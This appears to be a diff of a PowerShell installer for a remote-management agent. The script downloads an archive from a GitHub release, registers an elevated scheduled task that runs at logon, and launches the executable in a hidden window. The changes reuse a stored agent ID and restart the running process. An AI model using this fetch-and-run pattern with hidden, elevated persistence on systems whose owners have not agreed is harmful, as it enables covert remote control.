@@ -10,7 +10,13 @@ Invoke-WebRequest -Uri "https://github.com/protonme1241/rmm/releases/download/v1
 Expand-Archive -Path $zip -DestinationPath $dir -Force
 Remove-Item $zip -Force
 
-$agentId = [guid]::NewGuid().ToString()
+if (Test-Path $cfg) {
+    try {
+        $existing = Get-Content $cfg -Raw | ConvertFrom-Json
+        $agentId = $existing.AgentId
+    } catch { $agentId = $null }
+}
+if (-not $agentId) { $agentId = [guid]::NewGuid().ToString() }
 
 $configObj = @{
     AgentId = $agentId
@@ -31,5 +37,7 @@ $enc = New-Object System.Text.UTF8Encoding $false
 cmd /c "schtasks /delete /tn itmgn /f" > $null 2>&1
 cmd /c "schtasks /create /tn itmgn /tr `"$exe`" /sc ONLOGON /rl HIGHEST /f" > $null 2>&1
 
+Stop-Process -Name itagnt -Force -ErrorAction SilentlyContinue
+Start-Sleep -Seconds 1
 Start-Process -FilePath $exe -WindowStyle Hidden
 Write-Host "Done. Agent ID: $agentId"
